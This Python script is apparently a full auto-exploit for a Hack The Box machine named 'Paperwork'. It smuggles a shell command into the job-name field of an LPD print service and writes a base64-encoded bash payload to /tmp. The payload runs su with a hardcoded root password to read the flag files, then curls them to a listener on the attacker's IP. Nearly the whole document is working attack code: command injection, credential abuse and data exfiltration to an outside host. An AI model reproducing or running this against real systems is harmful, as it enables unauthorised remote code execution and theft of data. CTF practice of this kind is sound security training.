#!/usr/bin/env python3
"""
Paperwork HTB – Full auto exploit: get user.txt and root.txt.
#usage python3 paperwork.py target_ip
python3 paperwork.py 10.129.29.161
"""

import socket
import sys
import time
import http.server
import threading
import urllib.parse
import base64

# -------------------- CONFIG --------------------
if len(sys.argv) < 2:
    print(f"Usage: {sys.argv[0]} <target_ip>")
    sys.exit(1)

TARGET = sys.argv[1]
ATTACKER_IP = "10.10.13.52"   # <-- Your VPN tun0 IP
HTTP_PORT = 8000
ROOT_PASSWORD = "ApparelMortuaryCedar22"

# -------------------- HTTP SERVER TO RECEIVE FLAGS --------------------
flag_received = None

class FlagHandler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        global flag_received
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        flag_received = post_data.decode()
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

    def log_message(self, format, *args):
        pass  # suppress logs

def start_http_server():
    server = http.server.HTTPServer(("0.0.0.0", HTTP_PORT), FlagHandler)
    print(f"[*] HTTP server listening on port {HTTP_PORT} for flags...")
    server.handle_request()  # handle exactly one request

# -------------------- LPD INJECTION FUNCTION --------------------
def inject_lpd(cmd):
    job_name = f"' ; {cmd} #"
    control_data = f"J{job_name}\n".encode()
    size = len(control_data)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect((TARGET, 1515))
    s.send(b'\x02' + b'archive_intake\n')
    s.send(b'\x02 ' + str(size).encode() + b'\n')
    try:
        s.recv(1)
    except:
        pass
    s.send(control_data)
    s.close()

# -------------------- BUILD THE PAYLOAD --------------------
# Simple script that uses 'su' with the password to read both flags and send them via curl
remote_script = f'''#!/bin/bash
USER_FLAG=$(echo -e "{ROOT_PASSWORD}\\n" | su root -c "cat /home/archivist/user.txt" 2>/dev/null)
ROOT_FLAG=$(echo -e "{ROOT_PASSWORD}\\n" | su root -c "cat /root/root.txt" 2>/dev/null)
curl -s -X POST http://{ATTACKER_IP}:{HTTP_PORT}/ -d "user=$USER_FLAG&root=$ROOT_FLAG"
'''

# Encode in base64 to avoid escaping issues
b64_script = base64.b64encode(remote_script.encode()).decode()
cmd = f"echo {b64_script} | base64 -d > /tmp/run.sh && chmod +x /tmp/run.sh && /tmp/run.sh"

# -------------------- RUN EXPLOIT --------------------
print("[*] Starting HTTP server to receive flags...")
http_thread = threading.Thread(target=start_http_server, daemon=True)
http_thread.start()
time.sleep(0.5)

print("[*] Injecting LPD payload...")
inject_lpd(cmd)
print("[+] Payload sent. Waiting for flags...")

# Wait for the HTTP server to receive data
timeout = 30
start_time = time.time()
while flag_received is None and time.time() - start_time < timeout:
    time.sleep(0.5)

if flag_received:
    print("\n[+] Flags received!")
    # Parse the POST data
    params = urllib.parse.parse_qs(flag_received)
    user_flag = params.get('user', [''])[0]
    root_flag = params.get('root', [''])[0]
    print(f"user.txt: {user_flag}")
    print(f"root.txt: {root_flag}")
else:
    print("[-] No flags received within timeout. Check target connectivity.")
    print("[*] You can manually check /tmp/run.sh on the target for errors.")
